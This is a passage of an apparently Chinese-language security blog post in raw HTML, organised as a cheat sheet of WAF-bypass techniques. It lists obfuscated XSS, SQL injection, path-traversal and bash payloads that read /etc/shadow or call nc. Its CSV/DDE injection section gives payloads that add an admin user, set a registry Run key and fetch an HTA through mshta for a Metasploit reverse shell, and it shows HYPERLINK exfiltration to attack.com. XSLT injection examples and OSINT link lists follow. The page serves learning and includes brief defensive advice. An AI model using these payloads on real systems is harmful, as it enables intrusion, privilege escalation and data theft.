class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">基本要求：</span><br><span class="line"></span><br><span class="line"> &lt;marquee onstart=prompt()&gt; </span><br><span class="line"></span><br><span class="line">混淆视听：</span><br><span class="line"></span><br><span class="line"> &lt;marquee onstart=\u0070r\u06f\u006dpt()&gt; </span><br><span class="line"></span><br><span class="line">被 WAF 屏蔽：</span><br><span class="line"></span><br><span class="line"> /?redir=http://google.com </span><br><span class="line"></span><br><span class="line">旁路技术：</span><br><span class="line"></span><br><span class="line"> /?redir=http://google。com (Unicode alternative) </span><br><span class="line"></span><br><span class="line">被 WAF 屏蔽：</span><br><span class="line"></span><br><span class="line"> &lt;marquee loop=1 onfinish=alert()&gt;x </span><br><span class="line"></span><br><span class="line">旁路技术：</span><br><span class="line"></span><br><span class="line"> ＜marquee loop＝1 onfinish＝alert︵1)&gt;x (Unicode alternative) </span><br><span class="line"></span><br><span class="line">基本要求：</span><br><span class="line"></span><br><span class="line"> ../../etc/shadow </span><br><span class="line"></span><br><span class="line">混淆视听：</span><br><span class="line"></span><br><span class="line"> %C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFshadow </span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><p>HTML编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">基本要求：</span><br><span class="line"></span><br><span class="line"> &quot;&gt;&lt;img src=x onerror=confirm()&gt; </span><br><span class="line"></span><br><span class="line">编码有效载荷：</span><br><span class="line"></span><br><span class="line"> &amp;quot;&amp;gt;&amp;lt;img src=x onerror=confirm&amp;lpar;&amp;rpar;&amp;gt; </span><br><span class="line"></span><br><span class="line">编码有效载荷：</span><br><span class="line"></span><br><span class="line"> &amp;#34;&amp;#62;&amp;#60;img src=x onerror=confirm&amp;#40;&amp;#41;&amp;#62; </span><br></pre></td></tr></table></figure></li><li><p>混合编码</p></li><li><p>添加注释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">被 WAF 屏蔽：</span><br><span class="line"></span><br><span class="line"> &lt;script&gt;confirm()&lt;/script&gt; </span><br><span class="line"></span><br><span class="line">旁路技术：</span><br><span class="line"></span><br><span class="line"> &lt;!--&gt;&lt;script&gt;confirm/**/()/**/&lt;/script&gt; </span><br><span class="line"></span><br><span class="line">被 WAF 屏蔽：</span><br><span class="line"></span><br><span class="line"> /?id=1+union+select+1,2-- </span><br><span class="line"></span><br><span class="line">旁路技术：</span><br><span class="line"></span><br><span class="line"> /?id=1+un/**/ion+sel/**/ect+1,2-- </span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>双重编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">基本要求：</span><br><span class="line"></span><br><span class="line"> http://example/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\ </span><br><span class="line"></span><br><span class="line">混淆有效载荷</span><br><span class="line"></span><br><span class="line"> http://example/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\ </span><br><span class="line"></span><br><span class="line">基本要求：</span><br><span class="line"></span><br><span class="line"> &lt;script&gt;confirm()&lt;/script&gt; </span><br><span class="line"></span><br><span class="line">混淆有效载荷</span><br><span class="line"></span><br><span class="line"> %253Cscript%253Econfirm()%253C%252Fscript%253E </span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>通配符混淆</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">基本要求：</span><br><span class="line"></span><br><span class="line"> /bin/cat /etc/passwd </span><br><span class="line"></span><br><span class="line">混淆有效载荷</span><br><span class="line"></span><br><span class="line"> /???/??t /???/??ss?? </span><br><span class="line"></span><br><span class="line">使用过的字符</span><br><span class="line"></span><br><span class="line"> / ? t s </span><br><span class="line"></span><br><span class="line">基本要求：</span><br><span class="line"></span><br><span class="line"> /bin/nc 127.0.0.1 443 </span><br><span class="line"></span><br><span class="line">混淆有效载荷</span><br><span class="line"></span><br><span class="line"> /???/n? 2130706433 443 </span><br><span class="line"></span><br><span class="line">使用过的字符</span><br><span class="line"></span><br><span class="line"> / ? n [0-9]</span><br><span class="line"> </span><br><span class="line"> 基本要求：</span><br><span class="line"></span><br><span class="line"> &lt;script&gt;confirm()&lt;/script&gt; </span><br><span class="line"></span><br><span class="line">混淆有效载荷</span><br><span class="line"></span><br><span class="line"> &lt;script&gt;eval(&#x27;con&#x27;+&#x27;fi&#x27;+&#x27;rm()&#x27;)&lt;/script&gt; </span><br><span class="line"></span><br><span class="line">基本要求：</span><br><span class="line"></span><br><span class="line"> /bin/cat /etc/shadow </span><br><span class="line"></span><br><span class="line">混淆有效载荷</span><br><span class="line"></span><br><span class="line"> /bi&#x27;n&#x27;&#x27;&#x27;/c&#x27;&#x27;at&#x27; /e&#x27;tc&#x27;/sh&#x27;&#x27;ad&#x27;ow </span><br><span class="line"></span><br><span class="line">Bash 允许执行路径连接</span><br><span class="line"></span><br><span class="line">基本要求：</span><br><span class="line"></span><br><span class="line"> &lt;iframe/onload=&#x27;this[&quot;src&quot;]=&quot;javascript:confirm()&quot;&#x27;;&gt; </span><br><span class="line"></span><br><span class="line">混淆有效载荷</span><br><span class="line"></span><br><span class="line"> &lt;iframe/onload=&#x27;this[&quot;src&quot;]=&quot;jav&quot;+&quot;as&amp;Tab;cr&quot;+&quot;ipt:con&quot;+&quot;fir&quot;+&quot;m()&quot;&#x27;;&gt; </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>垃圾字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">基本要求：</span><br><span class="line"></span><br><span class="line"> &lt;script&gt;confirm()&lt;/script&gt; </span><br><span class="line"></span><br><span class="line">混淆有效载荷</span><br><span class="line"></span><br><span class="line"> &lt;script&gt;+-+-1-+-+confirm()&lt;/script&gt; </span><br><span class="line"></span><br><span class="line">基本要求：</span><br><span class="line"></span><br><span class="line"> &lt;BODY onload=confirm()&gt; </span><br><span class="line"></span><br><span class="line">混淆有效载荷</span><br><span class="line"></span><br><span class="line">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=confirm()&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">基本要求：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> &lt;a href=javascript;alert()&gt;ClickMe </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">旁路技术：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> &lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&amp;#97v&amp;#97script&amp;#x3A;&amp;#97lert(1)&gt;ClickMe</span><br></pre></td></tr></table></figure></li><li><p>中断换行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">基本要求：</span><br><span class="line"></span><br><span class="line"> &lt;iframe src=javascript:confirm(hacker)&quot;&gt; </span><br><span class="line"></span><br><span class="line">混淆有效载荷</span><br><span class="line"></span><br><span class="line"> &lt;iframe src=&quot;%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(hacker)&quot;&gt; </span><br></pre></td></tr></table></figure></li><li><p>未初始化变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">使用未初始化的 bash 变量来规避基于正则表达式的错误过滤器。</span><br><span class="line">这种值等于 null，作用类似于空字符串。</span><br><span class="line"></span><br><span class="line">一级混淆：正常</span><br><span class="line"></span><br><span class="line">  基本要求：</span><br><span class="line">    ● /bin/cat /etc/shadow </span><br><span class="line">  混淆有效载荷</span><br><span class="line">    ● /bin/cat$u /etc/shadow$u </span><br><span class="line"></span><br><span class="line">第二层混淆：基于位置</span><br><span class="line"></span><br><span class="line">  基本要求：</span><br><span class="line">    ● /bin/cat /etc/shadow </span><br><span class="line">  混淆有效载荷</span><br><span class="line">    ● $u/bin$u/cat$u $u/etc$u/shadow$u </span><br><span class="line"></span><br><span class="line">第三级混淆：随机字符</span><br><span class="line"></span><br><span class="line">  基本要求：</span><br><span class="line">    ● /bin/cat /etc/passwd </span><br><span class="line">  混淆有效载荷</span><br><span class="line">    ● $aaaaaa/bin$bbbbbb/cat$ccccccc $dddddd/etc$eeeeeee/passwd$fffffff</span><br></pre></td></tr></table></figure></li><li><p>制表符和换行</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">基本要求：</span><br><span class="line"></span><br><span class="line"> &lt;IMG SRC=&quot;javascript:confirm();&quot;&gt; </span><br><span class="line"></span><br><span class="line">旁路技术：</span><br><span class="line"></span><br><span class="line"> &lt;IMG SRC=&quot; javascript:confirm();&quot;&gt; </span><br><span class="line"></span><br><span class="line">变体：</span><br><span class="line"></span><br><span class="line"> &lt;IMG SRC=&quot; jav ascri pt:confirm ();&quot;&gt; </span><br><span class="line"></span><br><span class="line">基本要求：</span><br><span class="line"></span><br><span class="line"> http://test.com/test?id=1 union select 1,2,3 </span><br><span class="line"></span><br><span class="line">旁路技术：</span><br><span class="line"></span><br><span class="line"> http://test.com/test?id=1%09union%23%0A%0Dselect%2D%2D%0A%0D1,2,3 </span><br><span class="line"></span><br><span class="line">基本要求：</span><br><span class="line"></span><br><span class="line"> &lt;iframe src=javascript:confirm()&gt;&lt;/iframe&gt; </span><br><span class="line"></span><br><span class="line">混淆有效载荷</span><br><span class="line"></span><br><span class="line">&lt;iframe src=j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:c&amp;Tab;o&amp;Tab;n&amp;Tab;f&amp;Tab;i&amp;Tab;r&amp;Tab;m&amp;Tab;%28&amp;Tab;%29&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><h2 id="新学的-csv注入"><a href="#新学的-csv注入" class="headerlink" title="新学的-csv注入"></a>新学的-csv注入</h2><p>原理：</p><ol><li>excel工作原理：excel的一个特性：单元格中的第一个字符是“+、-、@、=”这样的符号时，他会以一个表达式的形式被处理</li><li>DDE。动态数据交换（DDE），是Windows下进程间通信协议，支持Microsoft Excel，LibreOffice和Apache OpenOffice。Excel、Word、Rtf、Outlook都可以使用这种机制，根据外部应用的处理结果来更新内容。因此，如果我们制作包含DDE公式的CSV文件，那么在打开该文件时，Excel就会尝试执行外部应用。</li></ol><p>比如说你在里面搞一个<code>=1+cmd|&#39;/C calc&#39;!A0</code>,按理说应该会弹计算器，但是win11已经知道这个并给他搞出去了</p><p><img src="https://pic1.imgdb.cn/item/6785b71cd0e0a243d4f40a3f.png" alt=""></p><p>看了眼人家成功时是2023.3，难怪了</p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><ul><li>添加用户：<code>=cmd|&#39;/C net user test 123456 /add&#39;!A0+&lt;br&gt;=cmd|&#39;/C net user test 123456 /add &amp;&amp; net localgroup administrators test /add&#39;!A0</code></li><li>修改注册表：<code>=cmd|&#39;/C reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v calc /t REG_SZ /d &quot;calc.exe&quot; /f&#39;!A0</code></li><li>反弹shell：可以和msf结合起来,msf这边<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/misc/hta_server</span><br><span class="line">msf exploit(windows/misc/hta_server) &gt; set srvhost 192.168.174.129 </span><br><span class="line">msf exploit(windows/misc/hta_server) &gt; exploit</span><br></pre></td></tr></table></figure>excel添加载荷<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+1+cmd|&#x27;/c mshta.exe http://192.168.192.135:8080/770MqXy.hta</span><br><span class="line">&#x27;!A0</span><br></pre></td></tr></table></figure></li><li>信息泄露：<code>=HYPERLINK(&quot;https://attack.com?data=&quot;&amp;A1,&quot;click me&quot;)</code></li><li>网络钓鱼：<code>=HYPERLINK(&quot;https://attack.com?data=&quot;&amp;A1,&quot;click me&quot;)</code></li></ul><p>或者是控制浏览器访问钓鱼网站<code>=1+cmd|&#39;/C   &quot;C:\Users\ASUS\AppData\Local\Google\Chrome\Application\chrome.exe&quot; https://attack.com &#39;!A0</code></p><h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式:"></a>绕过方式:</h3><p>在等于号被过滤时，可以通过运算符+-的方式绕过；</p><p><code>-1+1+cmd |’ /C calc’ !A0</code></p><p>参数处输入以下 Payload，%0A被解析，从而后面的数据跳转到下一行：</p><p><code>%0A-1+1+cmd|&#39; /C calc&#39;!A0</code></p><p>导出文件为 csv 时，若系统在等号=前加了引号’过滤，则可以使用分号绕过，分号；可分离前后两部分内容使其分别执行：</p><p><code>;-3+3+cmd|&#39; /C calc&#39;!D2</code></p><p>其他常用 Payload：</p><p><code>@SUM(cmd|&#39;/c calc&#39;!A0)</code></p><p><code>=HYPERLINK(&quot;https://attact.com&quot;)</code></p><h3 id="防御思路"><a href="#防御思路" class="headerlink" title="防御思路"></a>防御思路</h3><p>单元格不以特殊字符开头：<code>+,-,@,=</code></p><p>禁止导出CSV，XLS格式文件</p><p>黑名单过滤<code>=(-)cmd或=(-)HYPERLINK</code>或<code>=(-)concat</code>等</p><p>还有，在大部分情况下都会弹出Microsoft Office安全提示，只要不点“是”就行了，所以对于平时常规文件的传递中，要尽量为员工做好相关的安全意识培训来做相关的防范。</p><h2 id="XSLT注入"><a href="#XSLT注入" class="headerlink" title="XSLT注入"></a>XSLT注入</h2><p>SLT (Extensible Stylesheet Language Transformations)  是一种转换语言，主要是将一种XML文档转换为另外一种XML文档，或者其他格式的文档，例如：HTML和文本等。XSLT 使用 XPath 在 XML 文档中查找信息。XPath 被用来通过元素和属性在 XML 文档中进行导航。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;html xsl:version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:php=&quot;http://php.net/xsl&quot;&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;xsl:text&gt;xsl:vendor = &lt;/xsl:text&gt;&lt;xsl:value-of select=&quot;system-property(&#x27;xsl:vendor&#x27;)&quot;/&gt;&lt;br/&gt;</span><br><span class="line">        &lt;xsl:text&gt;xsl:version = &lt;/xsl:text&gt;&lt;xsl:value-of select=&quot;system-property(&#x27;xsl:version&#x27;)&quot;/&gt;&lt;br/&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;html xsl:version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:php=&quot;http://php.net/xsl&quot;&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;xsl:value-of name=&quot;bugbounty&quot; select=&quot;php:function(&#x27;phpinfo&#x27;)&quot;/&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/33?time__1311=n4Rx0DRDB7i%3DCq0vo4%2BxCq7KG%3D3jEdoubD">【译】XSLT attack</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://osintframework.com/</span><br><span class="line">https://i-intelligence.eu/uploads/public-documents/OSINT_Handbook_2020.pdf</span><br><span class="line">https://start.me/p/DPYPMz/the-ultimate-osint-collection</span><br><span class="line">https://docs.google.com/spreadsheets/d/18rtqh8EG2q1xBo2cLNyhIDuK9jrPGwYr9DI2UncoqJQ</span><br><span class="line">https://cipher387.github.io/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># Multipurpose</span><br><span class="line">https://shodan.io/</span><br><span class="line">https://censys.io/</span><br><span class="line">https://onyphe.io/</span><br><span class="line">https://app.netlas.io/</span><br><span class="line">https://hunter.how/</span><br><span class="line">https://fofa.so/</span><br><span class="line">https://fullhunt.io/</span><br><span class="line">https://www.zoomeye.org/</span><br><span class="line">https://www.criminalip.io/</span><br><span class="line">https://leakix.net/</span><br><span class="line">https://www.yougetsignal.com/</span><br><span class="line">https://intelx.io/</span><br><span class="line">https://pentest-tools.com/</span><br><span class="line">https://gofindwhois.com/</span><br><span class="line">https://gofindwho.com/</span><br><span class="line"># Public info gathering</span><br><span class="line"></span><br><span class="line"># Track website changes</span><br><span class="line">https://visualping.io/</span><br><span class="line">https://web.archive.org</span><br><span class="line"></span><br><span class="line"># Companies info</span><br><span class="line">https://opencorporates.com/companies</span><br><span class="line"></span><br><span class="line"># Domain Recon</span><br><span class="line">https://www.robtex.com/</span><br><span class="line">https://centralops.net</span><br><span class="line">https://viewdns.info/</span><br><span class="line">https://phpinfo.me/domain</span><br><span class="line">http://bgp.he.net/</span><br><span class="line">https://bgpview.io/</span><br><span class="line">https://suip.biz/</span><br><span class="line">https://dnsdumpster.com/</span><br><span class="line">https://www.whoxy.com/</span><br><span class="line">http://ipv4info.com/</span><br><span class="line">https://rapiddns.io/</span><br><span class="line">https://myip.ms/</span><br><span class="line">https://www.reversewhois.io/?</span><br><span class="line">https://www.whoxy.com/reverse-whois/</span><br><span class="line">https://reverse-whois.whoisxmlapi.com/api</span><br><span class="line">https://host.io/dashboard</span><br><span class="line">https://completedns.com/dns-history/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://multirbl.valli.org/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://tools.emailhippo.com/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://immuniweb.com/radar/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://crunchbase.com/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.postman.com/explore/</span><br><span class="line">https://rapidapi.com/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://serene-agnesi-57a014.netlify.app/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://exif-viewer.com/</span><br></pre></td></tr></table></figure><h3 id="google语法"><a href="#google语法" class="headerlink" title="google语法"></a>google语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span 